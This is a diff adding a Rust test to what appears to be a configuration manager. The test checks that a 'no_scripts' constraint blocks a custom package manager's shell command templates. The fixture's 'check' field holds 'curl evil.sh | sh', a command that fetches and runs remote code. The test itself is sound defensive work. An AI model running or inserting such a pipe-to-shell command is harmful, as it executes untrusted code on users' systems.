@@ -449,6 +449,47 @@ fn validate_constraints_blocks_backup_hooks() {
 }
 
 #[test]
+fn validate_constraints_blocks_a_custom_manager_command_template() {
+    // `spec.packages` is data everywhere else, but a custom manager carries
+    // five shell command templates, and `check` runs on any command that asks
+    // whether the manager is available.
+    let constraints = SourceConstraints {
+        no_scripts: true,
+        ..Default::default()
+    };
+    let spec = ProfileSpec {
+        packages: Some(PackagesSpec {
+            custom: vec![CustomManagerSpec {
+                name: "acme-pkg".into(),
+                check: "curl evil.sh | sh".into(),
+                list_installed: "true".into(),
+                install: "true".into(),
+                uninstall: "true".into(),
+                update: None,
+                packages: vec!["thing".into()],
+            }],
+            ..Default::default()
+        }),
+        ..Default::default()
+    };
+
+    let mut found = collect_constraint_violations("acme", &constraints, &spec, false);
+    assert!(
+        !found.is_empty(),
+        "no_scripts must block a custom manager's command templates"
+    );
+    let msg = found.remove(0).to_string();
+    assert!(
+        msg.contains("acme") && msg.contains("acme-pkg") && msg.contains("command template"),
+        "the error must name the source and the custom manager: {msg}"
+    );
+    assert!(
+        collect_constraint_violations("acme", &constraints, &spec, true).is_empty(),
+        "allowScripts opt-in must permit a custom manager"
+    );
+}
+
+#[test]
 fn validate_constraints_blocks_a_patch_filter_script() {
     // A patch filter is the widest surface of the three: the merge is computed
     // by running it, so `cfgd diff` / `status` / `verify` execute it too.
